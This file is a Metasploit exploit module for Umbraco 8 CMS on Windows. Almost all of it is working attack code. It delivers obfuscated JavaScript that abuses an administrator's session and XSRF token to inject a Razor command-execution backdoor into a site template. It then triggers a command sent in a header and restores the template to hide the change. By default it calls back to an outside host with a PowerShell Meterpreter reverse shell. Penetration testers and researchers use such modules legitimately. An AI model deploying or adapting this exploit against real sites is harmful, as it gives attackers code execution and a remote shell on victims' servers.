##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# 
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::JSObfu

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Umbraco CMS Remote Command Execution via XSS',
        'Description' => %q{
          
        },
        'License' => MSF_LICENSE,
        'Author' => ['stvnhrlnd'],
        'Targets' => [
          ['Umbraco 8 on Windows', {
            'Arch' => ARCH_CMD,
            'Platform' => 'win',
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/windows/powershell/meterpreter/reverse_tcp',
              'SRVPORT' => 80,
              'LHOST' => 'kali.umbsec.icu',
              'LPORT' => 443,
              'JsObfuscate' => 1
            }
          }]
        ],
      )
    )

    register_options([
      OptString.new('BACKOFFICE_API',
        [ true, 'The path to the Umbraco backoffice API', '/umbraco/backoffice/UmbracoApi' ]),
      OptString.new('RAZOR_TEMPLATE',
        [ true, 'The name of the Razor template to use for code execution', 'Home' ]),
      OptString.new('TRIGGER_URL',
        [ true, 'The URL of the page to request to trigger the command', '/' ]),
      OptString.new('TRIGGER_HEADER',
        [ true, 'The name of the HTTP header to trigger the command', 'Authorization' ])
    ])
  end

  #
  #
  #
  def exploit
    @js_ofs = js_obfuscate(generate_js)
    super
  end

  #
  #
  #
  def on_request_uri(cli, _request)
    send_response(cli, @js_ofs, headers = {
      'Content-Type' => 'text/javascript'
    })
  end

  #
  #
  #
  def generate_js
    cmdBase64 = Base64.strict_encode64(payload.encoded)

    %Q~

    // Payload configuration
    const cmdBase64 = "#{cmdBase64}";
    const umbracoAPI = "#{datastore['BACKOFFICE_API']}";
    const razorTemplateName = "#{datastore['RAZOR_TEMPLATE']}";
    const triggerURL = "#{datastore['TRIGGER_URL']}";
    const triggerHeaderName = "#{datastore['TRIGGER_HEADER']}";
    
    // Get all templates
    getJSON(umbracoAPI + "/Template/GetAll").then(function (allTemplates) {
      // Get template metadata by name
      const templateMetadata = allTemplates.find(function (template) {
        return template.name.includes(razorTemplateName);
      });
    
      // Get specific template
      getJSON(umbracoAPI + "/Template/GetById?id=" + templateMetadata.id).then(
        function (template) {
          // Save original template. It will be restored later on
          const originalTemplate = template.content;
    
          // Add payload to the end of the template
          template.content += generateRazor();
    
          // Save template
          postJSON(umbracoAPI + "/Template/PostSave", template).then(function (
            savedTemplate
          ) {
            // Hit URL to trigger command execution
            const triggerHeaders = {};
            triggerHeaders[triggerHeaderName] = cmdBase64;
            fetch(triggerURL, {
              headers: triggerHeaders,
            }).then(function (response) {
              // Reset to original template
              template.content = originalTemplate;
              postJSON(umbracoAPI + "/Template/PostSave", template);
            });
          });
        }
      );
    });
    
    function getCookie(name) {
      const value = "; " + document.cookie;
      const parts = value.split("; " + name + "=");
      if (parts.length === 2) return parts.pop().split(";").shift();
    }
    
    function getJSON(url) {
      return fetch(url, {
        method: "GET",
        credentials: "include",
        headers: {
          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
        },
      })
        .then(function (response) {
          return response.text();
        })
        .then(function (text) {
          return fromJSON(text);
        });
    }
    
    function postJSON(url, data) {
      return fetch(url, {
        method: "POST",
        body: JSON.stringify(data),
        credentials: "include",
        headers: {
          "x-umb-xsrf-token": getCookie("UMB-XSRF-TOKEN"),
          "Content-Type": "application/json",
        },
      })
        .then(function (response) {
          return response.text();
        })
        .then(function (text) {
          return fromJSON(text);
        });
    }
    
    function fromJSON(responseText) {
      // Remove XSSI prevention prefix from response body before parsing
      return JSON.parse(responseText.slice(6));
    }
    
    function generateRazor() {
      return (
        '\\n@if (!string.IsNullOrEmpty(Request.Headers["' +
        triggerHeaderName +
        '"]))' +
        "{" +
        "try" +
        "{" +
        "var cmd = System.Text.Encoding.UTF8.GetString(" +
        'System.Convert.FromBase64String(Request.Headers["' +
        triggerHeaderName +
        '"]));' +
        "using (var process = new System.Diagnostics.Process())" +
        "{" +
        'process.StartInfo.FileName = "cmd.exe";' +
        'process.StartInfo.Arguments = "/c " + cmd;' +
        "process.StartInfo.CreateNoWindow = true;" +
        "process.StartInfo.RedirectStandardOutput = true;" +
        "process.StartInfo.UseShellExecute = false;" +
        "process.Start();" +
        "}" +
        "}" +
        "catch { }" +
        "}"
      );
    }

    ~
  end
end
